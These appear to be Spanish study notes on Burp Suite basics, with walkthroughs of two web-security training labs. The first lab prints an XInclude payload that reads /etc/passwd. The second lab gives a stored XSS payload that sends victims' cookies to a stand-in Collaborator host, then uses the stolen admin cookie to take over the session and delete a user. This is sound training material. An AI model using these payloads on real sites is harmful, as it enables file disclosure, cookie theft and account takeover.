------
### QUE ES?
Las **Essential Skills** son las **habilidades básicas necesarias para realizar pruebas de seguridad web**.  
Incluyen conocimientos y técnicas fundamentales que permiten **analizar cómo funciona una aplicación web, interceptar peticiones, modificarlas y entender las respuestas del servidor**
Son la base para poder encontrar y explotar vulnerabilidades como **SQLi, XSS, CSRF o authentication flaws**.  
Normalmente implican manejar herramientas como **Burp Suite**, comprender **HTTP, cookies, sesiones, parámetros y lógica de las aplicaciones web**.
#### PASOS:
- _INTERCEPTAR TRAFICO:_ usar **Burp Proxy** para capturar peticiones HTTP del navegador.
- *ESCANEAR REQUESTS:* cargar las paginas en el dashboard y ejecutar un analisis.
- _MODIFICAR PETICIONES:_ enviar requests a **Burp Repeater** para cambiar parámetros y observar la respuesta.
- _ENUMERAR FUNCIONALIDAD:_ identificar endpoints, parámetros ocultos y comportamiento de la aplicación.
- _AUTOMATIZAR PRUEBAS:_ usar **Intruder, Decoder o Comparer** para fuzzing, encoding o análisis de respuestas.
### LAB1: DISCOVERING VULNERABILITIES QUICKLY WITH TARGET SCANNING
En este lab no nos dicen nada, solo que devolvamos el contenido del `/etc/passwd`. Para ello lo que podemos hacer es un analisis automatico en busca de vulnerabilidades. La idea es explorar un poco la web y desde el *Dashboard* de *Burpsuite* ejecutar un análisis clickando en *New Scan* este nos avisara si encuentra alguna vulnerabilidad, donde la encuentra y el payload usado. Tambien podemos añadir manualmente una request al *Dashboard* haciendo click derecho en la request desde *Proxy* → *Http History*. Pude haber falsos positivos.
En este caso la vulnerabilidad estaba en el *Check Stock*:
`productId=<pdr xmlns:xi=http://www.w3.org/2001/XInclude"><x1:include parse="text" href="file:///etc/passwd"></pdr>
### LAB2: SCANNING NON-STANDARD DATA STRUCTURES
1. Inicia sesión en tu cuenta con las credenciales proporcionadas.
2. En **Burp**, ve a **Proxy → HTTP history**.
3. Busca la petición **`GET /my-account?id=wiener`**, que contiene tu nueva **cookie de sesión autenticada**.
4. Analiza la cookie de sesión y observa que **contiene tu nombre de usuario en texto claro**, seguido de algún tipo de **token**.
5. Ambos valores están **separados por dos puntos (`:`)**, lo que sugiere que la aplicación **trata el valor de la cookie como dos entradas distintas**.
6. Selecciona la **primera parte de la cookie**, el **`wiener` en texto claro**.
7. Haz **clic derecho → Scan selected insertion point → OK**.
8. Ve al **Dashboard** y espera a que termine el escaneo.

Aproximadamente **un minuto después**, Burp Scanner reportará una vulnerabilidad de **Cross-Site Scripting almacenado (Stored XSS)**.
1. En el **Dashboard**, selecciona la vulnerabilidad detectada.
2. En el panel inferior, abre la pestaña **Request**. Contiene la petición que **Burp Scanner usó para identificar el problema**.
3. Envía esa petición a **Burp Repeater**.
4. Ve a la pestaña **Collaborator** y haz clic en **Copy to clipboard** para copiar un **payload de Burp Collaborator**.
5. En **Repeater**, usa el **Inspector** para ver la cookie **decodificada**.
6. Sustituye el **payload de prueba (PoC)** usado por Burp por uno que **exfiltre las cookies de la víctima**, por ejemplo:

`'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID

7. **Importante:** debes **mantener la segunda parte de la cookie**, que contiene **tu session ID**.
8. Haz clic en **Apply changes** y después en **Send**.
9. Vuelve a la pestaña **Collaborator**.
10. Después de aproximadamente **un minuto**, pulsa **Poll now**.
11. Verás que el servidor **Collaborator ha recibido nuevas interacciones DNS y HTTP**.
12. Selecciona una **interacción HTTP**.
13. En **Request to Collaborator**, observa que **la ruta de la petición contiene las cookies del usuario admin**.

 Usar la cookie del admin para acceder al panel de administración
1. Copia la **cookie de sesión del usuario admin**.
2. Abre el **navegador de Burp** y entra en **DevTools**.
3. Ve a **Application → Cookies**.
4. Sustituye **tu cookie de sesión** por la **cookie del admin** y **recarga la página**.
5. Accede al **panel de administración** y **elimina al usuario `carlos`** para completar el laboratorio.